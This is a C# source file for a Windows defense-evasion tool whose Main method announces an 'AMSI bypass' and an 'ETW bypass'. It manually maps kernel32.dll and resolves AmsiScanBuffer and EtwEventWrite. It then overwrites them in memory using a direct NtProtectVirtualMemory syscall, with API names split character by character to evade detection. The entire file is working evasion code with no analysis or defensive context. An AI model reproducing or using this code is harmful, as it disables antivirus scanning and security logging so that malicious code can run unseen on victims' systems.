using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Patch
{
    public class Program
    {
        public static void A3ZEE()
        {
            Data.PE.PE_MANUAL_MAP mappedDLL = new Data.PE.PE_MANUAL_MAP();

            mappedDLL = ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");

            object[] LLAparameters = { "a" + "m" + "s" + "i" + "." + "d" + "l" + "l" };
            IntPtr LLA = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase,
                "L" + "o" + "a" + "d" + "L" + "i" + "b" + "r" + "a" + "r" + "y" + "A", typeof(Helper.LoadLibrary),
                LLAparameters, false);
            Console.WriteLine("[*] A3ZEE Handle: 0x{0}", LLA.ToString("X"));

            object[] GPAparameters =
                { LLA, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r" };
            IntPtr GPA = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase,
                "G" + "e" + "t" + "P" + "r" + "o" + "c" + "A" + "d" + "d" + "r" + "e" + "s" + "s",
                typeof(Helper.GetProcAddress), GPAparameters, false);
            Console.WriteLine("[*] Export Address: 0x{0}", GPA.ToString("X"));

            var patch = Helper.A3ZEEPatch;
            uint oldProtect = 0;
            IntPtr syscall = DynamicInvoke.Generic.GetSyscallStub("N" + "t" + "P" + "r" + "o" + "t" + "e" + "c" + "t" +
                                                                  "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" +
                                                                  "m" + "o" + "r" + "y");
            Helper.NtProtectVirtualMemory ntProtectVirtualMemory =
                (Helper.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall,
                    typeof(Helper.NtProtectVirtualMemory));

            Process currProc = Process.GetCurrentProcess();
            IntPtr oldAddr = GPA;
            var regionSize = (IntPtr)patch.Length;
            oldProtect = 0;

            var result = ntProtectVirtualMemory(currProc.Handle, ref GPA, ref regionSize, 0x40, ref oldProtect);
            if (result == 0)
            {
                Console.WriteLine("[*] Changed protection successfully.");
            }
            else
            {
                Console.WriteLine("[-] Error. Could not change protection.");
            }

            Marshal.Copy(patch, 0, oldAddr, patch.Length);
            Console.WriteLine("[*] Patched DLL.");

            regionSize = (IntPtr)patch.Length;
            uint newProtect = 0;

            result = ntProtectVirtualMemory(currProc.Handle, ref oldAddr, ref regionSize, oldProtect, ref newProtect);
            if (result == 0)
            {
                Console.WriteLine("[*] Added protections back to normal.");
            }
            else
            {
                Console.WriteLine("[-] Error. Could not set protection back to normal.");
            }
        }

        public static void ETVV()
        {
            Data.PE.PE_MANUAL_MAP mappedDLL = new Data.PE.PE_MANUAL_MAP();
            mappedDLL = ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");

            object[] LLAparameters = { "n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l"};
            IntPtr LLA = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase,
                "L" + "o" + "a" + "d" + "L" + "i" + "b" + "r" + "a" + "r" + "y" + "A", typeof(Helper.LoadLibrary),
                LLAparameters, false);
            Console.WriteLine("[*] NTDLL Handle: 0x{0}", LLA.ToString("X"));


            object[] GPAparameters =
                { LLA, "E" + "t" + "w" + "E" + "v" + "e" + "n" + "t" + "W" + "r" + "i" + "t" + "e" };
            IntPtr GPA = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase,
                "G" + "e" + "t" + "P" + "r" + "o" + "c" + "A" + "d" + "d" + "r" + "e" + "s" + "s",
                typeof(Helper.GetProcAddress), GPAparameters, false);
            Console.WriteLine("[*] Export Address: 0x{0}", GPA.ToString("X"));

            var patch = Helper.ETVVPatch;
            uint oldProtect = 0;
            IntPtr syscall = DynamicInvoke.Generic.GetSyscallStub("N" + "t" + "P" + "r" + "o" + "t" + "e" + "c" + "t" +
                                                                  "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" +
                                                                  "m" + "o" + "r" + "y");
            Helper.NtProtectVirtualMemory ntProtectVirtualMemory =
                (Helper.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall,
                    typeof(Helper.NtProtectVirtualMemory));

            Process currProc = Process.GetCurrentProcess();
            IntPtr oldAddr = GPA;
            var regionSize = (IntPtr)patch.Length;
            oldProtect = 0;

            var result = ntProtectVirtualMemory(currProc.Handle, ref GPA, ref regionSize, 0x40, ref oldProtect);
            if (result == 0)
            {
                Console.WriteLine("[*] Changed protection successfully.");
            }
            else
            {
                Console.WriteLine("[-] Error. Could not change protection.");
            }

            Marshal.Copy(patch, 0, oldAddr, patch.Length);
            Console.WriteLine("[*] Patched DLL.");

            regionSize = (IntPtr)patch.Length;
            uint newProtect = 0;

            result = ntProtectVirtualMemory(currProc.Handle, ref oldAddr, ref regionSize, oldProtect, ref newProtect);
            if (result == 0)
            {
                Console.WriteLine("[*] Added protections back to normal.");
            }
            else
            {
                Console.WriteLine("[-] Error. Could not set protection back to normal.");
            }
        }

        public static void Main(string[] args)
        {
            Console.WriteLine("[*] Press a key for AMSI bypass...");
            Console.ReadKey();
            A3ZEE();
            Console.WriteLine("[*] Press a key for ETW bypass...");
            Console.ReadKey();
            ETVV();
        }
    }
}

